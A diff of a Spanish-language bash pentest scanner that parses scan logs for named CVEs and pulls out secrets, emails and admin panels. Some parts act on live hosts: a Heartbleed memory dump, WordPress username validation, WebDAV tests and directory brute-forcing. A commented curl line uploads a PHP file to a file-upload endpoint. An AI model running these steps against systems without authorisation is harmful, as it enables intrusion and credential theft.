+	grep SUCCEED logs/vulnerabilidades/"$host"_"$port"_webdav.txt > .vulnerabilidades/"$host"_"$port"_webdav.txt 2>/dev/null
+	grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port"_IIS~CVE~2017~7269.txt  2>/dev/null |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > .vulnerabilidades/"$host"_"$port"_IIS~CVE~2017~7269.txt
+	######
 
-	for host in $lista_hosts; do
-		echo -e "Parse $host:$port"
-		cp logs/enumeracion/"$host"_"$port"_joomla-version.txt .enumeracion/"$host"_"$port"_joomla-version.txt 2>/dev/null
-		grep -i 'valid credentials' logs/vulnerabilidades/"$host"_"$port"_passwordDefecto.txt 2>/dev/null | sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > .vulnerabilidades/"$ip"_"$port"_passwordDefecto.txt
-		egrep --color=never "^200|^401" logs/vulnerabilidades/"$host"_"$port"_backupweb.txt >> .vulnerabilidades/"$host"_"$port"_backupweb.txt 2>/dev/null
-		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webarchivos.txt  >> .enumeracion/"$host"_"$port"_webarchivos.txt  2>/dev/null		
-		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_SharePoint.txt >> .enumeracion/"$host"_"$port"_SharePoint.txt 2>/dev/null				
-		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webadmin.txt > .enumeracion/"$host"_"$port"_webadmin.txt  2>/dev/null		
-		egrep --color=never "^200|^401|^403" logs/enumeracion/"$host"_"$port"_webdirectorios.txt	> .enumeracion/"$host"_"$port"_webdirectorios.txt 2>/dev/null
-		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_archivosSAP.txt > .enumeracion/"$host"_"$port"_archivosSAP.txt 2>/dev/null		
-
-		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webserver.txt > .enumeracion/"$host"_"$port"_webarchivos.txt  2>/dev/null		
-		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webservices.txt > .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null		
-		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_asp-files.txt > .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
-		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_graphQL.txt > .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null		     
-		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_php-files.txt > .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
-		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_archivosTomcat.txt > .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
-		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_aspx-files.txt > .enumeracion/"$host"_"$port"_aspx-files.txt 2>/dev/null
-
-		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_archivosCGI.txt 2>/dev/null | awk '{print $2}' >> servicios/cgi.txt
-		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_archivosCGI.txt > .enumeracion/"$host"_"$port"_archivosCGI.txt 2>/dev/null 		
-		egrep --color=never "^200|^401" logs/vulnerabilidades/"$host"_"$port"_archivosDefecto.txt > .vulnerabilidades/"$host"_"$port"_archivosDefecto.txt 2>/dev/null 		
-		egrep --color=never "^200|^401" logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt  >> .vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt 2>/dev/null
-		egrep --color=never "^200|^401" logs/vulnerabilidades/"$host"_"$port"_webshell.txt >> .vulnerabilidades/"$host"_"$port"_webshell.txt 2>/dev/null		
-		egrep --color=never "^200|^401" logs/vulnerabilidades/"$host"_"$port"_divulgacionInformacion.txt > .vulnerabilidades/"$host"_"$port"_divulgacionInformacion.txt 2>/dev/null		
-		grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port"_HTTPsys.txt
-		grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt
-		grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt 2>/dev/null |  egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt
-		grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_sap-netweaver-leak.txt 2>/dev/null |  egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port"_sap-netweaver-leak.txt
-		grep --color=never "401" logs/enumeracion/"$host"_"$port"_certfnsh.txt > .enumeracion/"$host"_"$port"_certfnsh.txt
-
-		grep --color=never 'Grade cap ' -m1 -b1 -A20 logs/vulnerabilidades/"$host"_"$port"_testSSL.txt > logs/vulnerabilidades/"$host"_"$port"_confTLS.txt 2>/dev/null
-		grep --color=never 'Grade cap ' -m1 -b1 -A20 logs/vulnerabilidades/"$host"_"$port"_testSSL.txt > logs/vulnerabilidades/"$host"_"$port"_vulTLS.txt 2>/dev/null		
-		grep -i --color=never "incorrecta" logs/vulnerabilidades/"$host"_"$port"_confTLS.txt | egrep -iv "Vulnerable a" | cut -d '.' -f2-4 > .vulnerabilidades/"$host"_"$port"_confTLS.txt 2>/dev/null
-		#grep -i --color=never "ofrecido" logs/vulnerabilidades/"$host"_"$port"_vulTLS.txt | cut -d '.' -f2-4 > .vulnerabilidades/"$host"_"$port"_vulTLS.txt 2>/dev/null
-		grep -i --color=never "Certificado expirado" logs/vulnerabilidades/"$host"_"$port"_vulTLS.txt | cut -d '.' -f2-4 >> .vulnerabilidades/"$host"_"$port"_vulTLS.txt 2>/dev/null
-		grep -i --color=never "VULNERABLE" logs/vulnerabilidades/"$host"_"$port"_vulTLS.txt | cut -d '.' -f2-4 >> .vulnerabilidades/"$host"_"$port"_vulTLS.txt 2>/dev/null
-
-		egrep --color=never "200|vulnerable" logs/vulnerabilidades/"$host"_"$port"_sap-scan.txt  >> .vulnerabilidades/"$host"_"$port"_sap-scan.txt 2>/dev/null
-		egrep --color=never "Registro habilitado" logs/vulnerabilidades/"$host"_"$port"_registroHabilitado.txt  >> .vulnerabilidades/"$host"_"$port"_registroHabilitado.txt	2>/dev/null
-		egrep --color=never "root" logs/vulnerabilidades/"$host"_"$port"_citrixVul.txt 2>/dev/null | grep -vi 'error' > .vulnerabilidades/"$host"_"$port"_citrixVul.txt 		
-		egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$host"_"$port"_CVE-2020-0688.txt > .vulnerabilidades/"$host"_"$port"_CVE-2020-0688.txt 2>/dev/null
-		egrep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port"_apacheTraversal.txt  > .vulnerabilidades/"$host"_"$port"_apacheTraversal.txt 2>/dev/null
-		egrep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port"_bigIPVul.txt > .vulnerabilidades/"$host"_"$port"_bigIPVul.txt 2>/dev/null
-		egrep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port"_pulseVul.txt > .vulnerabilidades/"$host"_"$port"_pulseVul.txt 2>/dev/null
-		egrep -i "Apache Struts Vulnerable" logs/vulnerabilidades/"$host"_"$port"_apacheStruts.txt > .vulnerabilidades/"$host"_"$port"_apacheStruts.txt 2>/dev/null
-		egrep '\[+\]' logs/enumeracion/"$host"_"$port"_shortname.txt 2>/dev/null |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" >> .enumeracion/"$host"_"$port"_shortname.txt
-		egrep uid logs/vulnerabilidades/"$host"_"$port"_cve-2021-41773.txt > .vulnerabilidades/"$host"_"$port"_cve-2021-41773.txt 2>/dev/null
-		egrep 'WEB-INF' logs/vulnerabilidades/"$host"_"$port"_CGIServlet.txt > .vulnerabilidades/"$host"_"$port"_CGIServlet.txt 2>/dev/null
-		egrep '\[info\]' logs/vulnerabilidades/"$host"_"$port"_proxynoshell.txt > .vulnerabilidades/"$host"_"$port"_proxynoshell.txt 2>/dev/null
-		egrep '\[info\]' logs/vulnerabilidades/"$host"_"$port"_proxyshell.txt > .vulnerabilidades/"$host"_"$port"_proxyshell.txt 2>/dev/null
-		egrep --color=never "INTERNAL_PASSWORD_ENABLED" logs/vulnerabilidades/"$host"_"$port"_cve2020-3452.txt > .vulnerabilidades/"$host"_"$port"_cve2020-3452.txt 2>/dev/null
-
-		egrep '\[+\]' logs/vulnerabilidades/"$host"_"$port"_wordpressGhost.txt 2>/dev/null |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" >> .vulnerabilidades/"$host"_"$port"_wordpressGhost.txt 2>/dev/null
-		grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port"_wordpress-CVE-2022-21661.txt > .vulnerabilidades/"$host"_"$port"_wordpress-CVE-2022-21661.txt 2>/dev/null
-		grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port"_wordpress-plugins.txt > .vulnerabilidades/"$host"_"$port"_wordpress-plugins.txt 2>/dev/null
-		grep -i 'demo.sayHello' logs/vulnerabilidades/"$host"_"$port"_xml-rpc-habilitado.txt > .vulnerabilidades/"$host"_"$port"_xml-rpc-habilitado.txt 2>/dev/null
-		grep -i 'incorrect' logs/vulnerabilidades/"$host"_"$port"_xml-rpc-login.txt > .vulnerabilidades/"$host"_"$port"_xml-rpc-login.txt 2>/dev/null
-
-		grep --color=never "|" logs/enumeracion/"$host"_"$port"_hadoopNamenode.txt  2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .enumeracion/"$host"_"$port"_hadoopNamenode.txt 
-
-		#nuclei
-		egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_apache-nuclei.txt > .vulnerabilidades/"$host"_"$port"_apache-nuclei.txt 2>/dev/null
-		egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_tomcat-nuclei.txt > .vulnerabilidades/"$host"_"$port"_tomcat-nuclei.txt 2>/dev/null
-		egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_joomla-nuclei.txt > .vulnerabilidades/"$host"_"$port"_joomla-nuclei.txt 2>/dev/null
-		egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_wordpress-nuclei.txt > .vulnerabilidades/"$host"_"$port"_wordpress-nuclei.txt 2>/dev/null
-		egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_drupal-nuclei.txt > .vulnerabilidades/"$host"_"$port"_drupal-nuclei.txt 2>/dev/null
-
-		cat logs/vulnerabilidades/"$host"_"$port"_droopescan.txt > .enumeracion/"$host"_"$port"_droopescan.txt	2>/dev/null 		
-		cat logs/vulnerabilidades/"$host"_"$port"_wpUsers.json 2>/dev/null  | wpscan-parser.py   2>/dev/null | grep -iv 'Rss Generator' | awk {'print $2'} > logs/vulnerabilidades/"$host"_"$port"_wpUsers.txt 2>/dev/null
-		
-		for username in `cat logs/vulnerabilidades/"$host"_"$port"_wpUsers.txt`
-		do						
-			if [ "$VERBOSE" == 's' ]; then echo "probando si $username es valido"; fi 
-			respuesta=`validate-wordpress-user -url $proto_http://$host:$port/ -username $username`			
-			sleep 4
-			if [[ ( ${respuesta} == *"no existe"* && ${username} == *"-"* && ! -z $DOMINIO )]];then 
-				username="${username//-/.}" # reemplazar - con .
-				username="$username@$DOMINIO"
-				username="${username//www./}"
-				if [ "$VERBOSE" == 's' ]; then echo "probando si $username es valido"; fi 
-				respuesta=`validate-wordpress-user -url $proto_http://$host:$port/ -username $username`
-				sleep 4
-			fi
-#			echo "respuesta $respuesta"
-			if [[ ${respuesta} == *"usuario valido"*  ]] ; then
-				echo $username >> .vulnerabilidades/"$host"_"$port"_wpUsers.txt
-			fi
-		done
- 		
-		cat logs/vulnerabilidades/"$host"_"$port"_wpUsers.json 2>/dev/null | jq -r '.version.number' > .enumeracion/"$host"_"$port"_wp-version.txt 2>/dev/null 
-
-		
-		#heartbleed
-		egrep -qi "VULNERABLE" logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt 2>/dev/null 
-		greprc=$?
-		if [[ $greprc -eq 0 ]] ; then						
-			echo -e "\t\t$OKRED[!] Vulnerable a heartbleed \n $RESET"
-			grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port"_heartbleed.txt				
-			$proxychains heartbleed.py $host -p $port 2>/dev/null | head -100 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' > .vulnerabilidades/"$host"_"$port"_heartbleedRAM.txt					
-			$proxychains heartbleed.sh $host $port &
-		fi	
-
-		#Redirect con contenido
-		egrep -qi "posiblemente vulnerable" logs/enumeracion/"$hosta"_"$port"_httpmethods.txt 2>/dev/null
-		greprc=$?
-		if [[ $greprc -eq 0  ]];then
-			if [ "$VERBOSE" == 's' ]; then  echo "Redireccion con contenido DETECTADO $proto_http://$host:$port "; fi				
-			curl --max-time 10 -k $proto_http://$host:$port > .vulnerabilidades/"$host"_"$port"_redirectContent.txt &
-		fi							
-
-		#WebDAV			
-		egrep -i "OK" logs/enumeracion/"$host"_"$port"_httpmethods.txt 2>/dev/null| grep -iq 'PROPFIND'
-		greprc=$?
-		if [[ $greprc -eq 0  ]];then
-			if [[ $VERBOSE -eq 's'  ]];then echo "Metodo PROPFIND DETECTADO"; fi
-			if [[ "$port" != "80" && "$port" != '443' ]];then
-				davtest -url $proto_http://$host:$port >> logs/vulnerabilidades/"$host"_"$port"_webdav.txt 2>>logs/vulnerabilidades/"$host"_"$port"_webdav.txt &
+	##### Identificar paneles administrativos #####
+	echo " ##### Identificar paneles administrativos ##### "
+	touch .enumeracion/canary_webData.txt # para que grep no falle cuando solo hay un archivo
+	fingerprint=''
+	list_admin=`egrep -ira "inicia|Nextcloud|User Portal|keycloak|inicio|kiosko|login|Quasar App|controlpanel|cpanel|whm|webmail|phpmyadmin|Web Management|Office|intranet|InicioSesion|S.R.L.|SRL|Outlook|Zimbra Web Client|Sign In|PLATAFORMA|Iniciar sesion|Sistema|Usuarios|Grafana|Ingrese" .enumeracion/*webData.txt 2>/dev/null| egrep -vi "Fortinet|Cisco|RouterOS|Juniper|TOTVS|xxxxxx|Mini web server|SonicWALL|Check Point|sameHOST|OpenPhpMyAdmin|hikvision" | sort | cut -d ":" -f1 |  cut -d "/" -f2| cut -d "_" -f1-2` #acreditacion.sucre.bo_80
+		for line in $(echo $list_admin); do 			
+			if [ "$VERBOSE" == 's' ]; then  echo "line $line" ; fi
+			host=`echo $line | cut -d "_" -f 1` # 190.129.69.107:80
+			port=`echo $line | cut -d "_" -f 2`
+			fingerprint1=`echo $line | cut -d ":" -f 2`
+			if [[ ${port} == *"443"* || ${port} == *"9091"*  ]]; then
+				proto_http="https"
 			else
-				davtest -url $proto_http://$host >> logs/vulnerabilidades/"$host"_"$port"_webdav.txt 2>>logs/vulnerabilidades/"$host"_"$port"_webdav.txt &
+				proto_http="http"
 			fi
-			#exploit cadaver
+			url="$proto_http://$host:$port/"
+			
+			if [[ ${fingerprint} == *"$fingerprint1"* ]]; then
+				echo "Mismo servicio corriendo "
+			else
+				if [ "$VERBOSE" == 's' ]; then  echo "url $url" ; fi
+				echo $url >> servicios/admin-web.txt
+			fi	
+			fingerprint=$fingerprint1		
+		done
+	############
+	insert_data
 
-			grep -i IIS .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "302 Found|AngularJS|BladeSystem|cisco|Cloudflare|Coyote|Express|GitLab|GoAhead-Webs|Nextcloud|Always200-OK|Open Source Routing Machine|oracle|Outlook|owa|ownCloud|Pfsense|Roundcube|Router|SharePoint|Taiga|Zentyal|Zimbra"  # no redirecciona
-			greprc=$?
-			if [[ $greprc -eq 0  ]];then 															
-				explodingcan-checker.py -t $proto_http://$host:$port> logs/vulnerabilidades/"$host"_"$port"_CVE-2017-7269.txt &
-			fi
-			# https://www.exploit-db.com/exploits/41992/								
-		fi		
-	done #for hosts		
-done # for web.txt
-########
+	#################### Realizar escaneo de directorios (2do nivel) a los directorios descubiertos ######################
+	if [[ "$PROXYCHAINS" == "n" && "$INTERNET" == 'n' ]]; then 		
+		echo -e "$OKBLUE #################### Realizar escaneo de directorios (2do nivel) a los directorios descubiertos ######################$RESET"
+		cat .enumeracion2/*webdirectorios.txt | egrep -v '401|403' | uniq > logs/enumeracion/webdirectorios_uniq.txt
+		while IFS= read -r line
+		do		
+			echo -e "\n\t########### $line #######"										
+			#line= 200	https://inscripcion.notariadoplurinacional.gob.bo:443/manual/ (Listado directorio activo)	 ,
+			while true; do
+				free_ram=`free -m | grep -i mem | awk '{print $7}'`		
+				script_instancias=$((`ps aux | grep perl | wc -l` - 1)) 		
+				if [[ $free_ram -gt $MIN_RAM  && $script_instancias -lt $MAX_SCRIPT_INSTANCES  ]]
+				then
+					if [[ ${line} != *"Listado directorio"*  &&  ${line} != *"wp-"* &&  ${line} != *".action"* &&  ${line} != *"index"*  ]] ; then
+						proto_http=`echo $line | cut -d ":" -f 1 | cut -d ' ' -f2` #  http/https
+						host_port=`echo $line | cut -d "/" -f 3` # 190.129.69.107:80							
+						host=`echo $host_port | cut -d ":" -f 1` #puede ser subdominio tb
+						port=`echo $host_port | cut -d ":" -f 2`		
+						path_web=`echo $line | cut -d "/" -f4 | tr '[:upper:]' '[:lower:]'` #minuscula
+					
+						if [[ ${path_web} != *"."* && ${path_web} != *"manual"* && ${path_web} != *"dashboard"* && ${path_web} != *"docs"* && ${path_web} != *"license"* && ${path_web} != *"wp"* && ${path_web} != *"aspnet_client"*  && ${path_web} != *"autodiscover"*  && ${path_web} != *"manager/html"* && ${path_web} != *"manual"* && ${path_web} != *"manual"*  ]];then   # si es un directorio (no un archivo) y el listado de directorios no esta habilitado
 
-if [ "$MODE" == "total" ] && [ ! -z $DOMINIO ] ; then
-	echo -e "[+] Extraer metadatos de sitios clonados (DOMINIO= $DOMINIO)"	
-	exiftool archivos/$DOMINIO/ > logs/enumeracion/"$DOMINIO"_metadata_exiftool.txt
-	egrep -i "Author|creator|modified" logs/enumeracion/"$DOMINIO"_metadata_exiftool.txt | cut -d ":" -f2 | egrep -iv "tool|adobe|microsoft|PaperStream|Acrobat|JasperReports|Mozilla" |sort |uniq  > .enumeracion/"$DOMINIO"_metadata_exiftool.txt
+							egrep -i "drupal|wordpress|joomla|moodle" .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"
+							greprc=$?						
+							if [[ $greprc -eq 1 ]]; then	
+								waitWeb 2.5
+								echo -e "\t\t[+] Enumerando directorios de 2do nivel ($path_web)" 
+								web-buster.pl -r 0 -t $host -p $port -s $proto_http -h $hilos_web -d "/$path_web/" -m folders $param_msg_error | egrep --color=never "^200" >> .enumeracion/"$host"_"$port"_webdirectorios2.txt &
 
-	##### Reporte metadatos (sitio web) ##
-	# sed 's/ /-/g' -i .enumeracion/"$DOMINIO"_metadata_exiftool.txt # cambiar espacios por "-"
-	# echo "Nombre;Apellido;Correo;Cargo" > reportes/correos_metadata.csv
-	# for nombretotal in `more .enumeracion/"$DOMINIO"_metadata_exiftool.txt 2>/dev/null`; do	
-	# #echo "nombretotal $nombretotal"
-	# 	if [[ ${nombretotal} == *"-"*  ]];then 			
-	# 		nombre=`echo $nombretotal | cut -f1 -d "-"`
-	# 		apellido=`echo $nombretotal | cut -f2 -d "-"`
-	# 		echo "$nombre;$apellido;$apellido@$DOMINIO;n/a" > reportes/correos_metadata.csv 
-	# 	fi
-	# done
-	################
+								web-buster.pl -r 0 -t $host -p $port -s $proto_http -h $hilos_web -d "/$path_web/" -m archivosPeligrosos $param_msg_error | egrep --color=never "^200" >> .vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt &
+							fi		
+							
+							#TODO
+							#curl -F "files=@/usr/share/lanscanner/info.php" http://10.11.1.123/books/apps/jquery-file-upload/server/php/index.php > logs/vulnerabilidades/"$ip"_"$port"_jqueryUpload.txt
+							#grep "info.php" logs/vulnerabilidades/"$ip"_"$port"_jqueryUpload.txt > .vulnerabilidades/"$ip"_"$port"_jqueryUpload.txt		
+						else
+							echo -e "\t[-] No vale la pena escanear este directorio "
+						fi				
+						sleep 1
+					else
+						echo -e "\t[-] El listado de directorios esta activo o es un directorio de wordpress "
+					fi #revisar q el listado de directorio esta habilitado
+					
+					break		
+				else				
+					script_instancias=`ps aux | grep perl | wc -l`
+					echo -e "\t[-] Maximo número de instancias de perl ($script_instancias) RAM = $free_ram Mb"
+					sleep 3									
+				fi	
+			done #while				
+		done < logs/enumeracion/webdirectorios_uniq.txt
+			
+	fi  
 
-	#  Eliminar URLs repetidas (clonacion)
-	echo -e "[+] Eliminar URLs repetidas (Extraidos de la clonacion)"										
-	sort logs/enumeracion/"$DOMINIO"_web_wget2.txt 2>/dev/null | uniq > .enumeracion/"$DOMINIO"_web_wgetURLs.txt
-	
-
-	# filtrar error de conexion a base de datos y otros errores
-	egrep -ira --color=never "mysql_query| mysql_fetch_array|access denied for user|mysqli|Undefined index" webClone/$DOMINIO/* 2>/dev/null| sed 's/webClone\///g' >> .enumeracion/"$DOMINIO"_web_errores.txt
-
-	# correos presentes en los sitios web
-	grep -Eirao "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" webClone/$DOMINIO/* | cut -d ":" -f2 | egrep --color=never $"com|net|org|bo|es" | grep $DOMINIO |  sort |uniq  >> logs/enumeracion/"$DOMINIO"_web_correos.txt
-	cat  logs/enumeracion/"$DOMINIO"_web_correos.txt .enumeracion2/*_recon_correos.txt 2>/dev/null | grep "$DOMINIO" | sed 's/x22//' |  sed 's/x2//' |  sort |uniq  > .enumeracion/"$DOMINIO"_consolidado_correos.txt
-
-	egrep -ira --color=never "aws_access_key_id|aws_secret_access_key" webClone/$DOMINIO/* > .vulnerabilidades/"$DOMINIO"_aws_secrets.txt 
-
-	#echo -e "[+] Buscar datos sensible en archivos clonados"	
-	#echo "cd webClone/$DOMINIO"
-	#cd webClone/$DOMINIO
-		#rm checksumsEscaneados.txt # tiene hashes md5 
-		# Creando repositorio temporal para que pueda ser escaneado por las herramientas
-
-		# cat scripts.js | js-beautify  | tee scripts.js
-
-		# rm -rf .git 2>/dev/null
-		# git init >/dev/null 2>/dev/null
-		# git add . >/dev/null 2>/dev/null
-		# git commit -m "test" >/dev/null 2>/dev/null
-
-		# # llaves SSH
-		# echo -e "\nllaves SSH" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
-		# docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 70 --max-key 72 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
-
-		# # AWS Secret Access Key
-		# echo -e "\nAWS Secret Access Key" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
-		# docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 40 --max-key 40 --entropy 4.3   | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
-
-		# # Azure Shared Key
-		# echo -e "\nAzure Shared Key" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
-		# docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 66 --max-key 66 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
-
-		# # RSA private key 
-		# echo -e "\n RSA private key " >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
-		# docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 76 --max-key 76 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
-
-		# # passwords 
-		# echo -e "\n passwords " >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
-		# docker run -v "$(pwd):/files" -it dumpster-diver -p files --min-pass 9 --max-pass 15 --pass-complex 8  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
+fi #sitio escaneado
 
 
-		# # generic token - dumpster-diver
-		# echo -e "\n generic token (dumpster-diver)" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
-		# docker run -v "$(pwd):/files" -it dumpster-diver -p files --min-key 25 --max-key 40 --entropy 4.6  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
-
-		# generic token - truffle
-		#docker run --rm -v "$(pwd):/project" trufflehog  --rules /etc/truffle-rules.json  --exclude_paths  /etc/truffle-exclude.txt --regex --json file:///project  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > ../logs/vulnerabilidades/"$DOMINIO"_trufflehog_secrets.txt
-
-	#cd ../../
-
-	#grep "found" logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt > .vulnerabilidades/"$DOMINIO"_web_secrets.txt 
-	#grep "found" logs/vulnerabilidades/"$DOMINIO"_trufflehog_secrets.txt >> .vulnerabilidades/"$DOMINIO"_web_secrets.txt 	
-	###################
-fi
-
-####Parse 2
-pwd
-grep SUCCEED logs/vulnerabilidades/"$host"_"$port"_webdav.txt > .vulnerabilidades/"$host"_"$port"_webdav.txt 2>/dev/null
-grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port"_CVE-2017-7269.txt  2>/dev/null |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > .vulnerabilidades/"$host"_"$port"_CVE-2017-7269.txt
-######
-
-
-
-##### Identificar paneles administrativos #####
-echo " ##### Identificar paneles administrativos ##### "
-touch .enumeracion/canary_webData.txt # para que grep no falle cuando solo hay un archivo
-fingerprint=''
-list_admin=`egrep -ira "inicia|Nextcloud|User Portal|keycloak|inicio|kiosko|login|Quasar App|controlpanel|cpanel|whm|webmail|phpmyadmin|Web Management|Office|intranet|InicioSesion|S.R.L.|SRL|Outlook|Zimbra Web Client|Sign In|PLATAFORMA|Iniciar sesion|Sistema|Usuarios|Grafana|Ingrese" .enumeracion/*webData.txt 2>/dev/null| egrep -vi "Fortinet|Cisco|RouterOS|Juniper|TOTVS|xxxxxx|Mini web server|SonicWALL|Check Point|sameHOST|OpenPhpMyAdmin|hikvision" | sort | cut -d ":" -f1 |  cut -d "/" -f2| cut -d "_" -f1-2` #acreditacion.sucre.bo_80
-	for line in $(echo $list_admin); do 			
-		if [ "$VERBOSE" == 's' ]; then  echo "line $line" ; fi
-		host=`echo $line | cut -d "_" -f 1` # 190.129.69.107:80
-		port=`echo $line | cut -d "_" -f 2`
-		fingerprint1=`echo $line | cut -d ":" -f 2`
-		if [[ ${port} == *"443"* || ${port} == *"9091"*  ]]; then
-			proto_http="https"
-		else
-			proto_http="http"
-		fi
-		url="$proto_http://$host:$port/"
-		
-		if [[ ${fingerprint} == *"$fingerprint1"* ]]; then
-			echo "Mismo servicio corriendo "
-		else
-			if [ "$VERBOSE" == 's' ]; then  echo "url $url" ; fi
-			echo $url >> servicios/admin-web.txt
-		fi	
-		fingerprint=$fingerprint1		
-	done
-############
-
-insert_data
 
 
 ######### find services ###
@@ -1691,21 +1791,21 @@ cd .enumeracion2/
 	touch canary.txt # es necesario que exista al menos 2 archivos 
 	echo '' > canary_cert.txt 
 
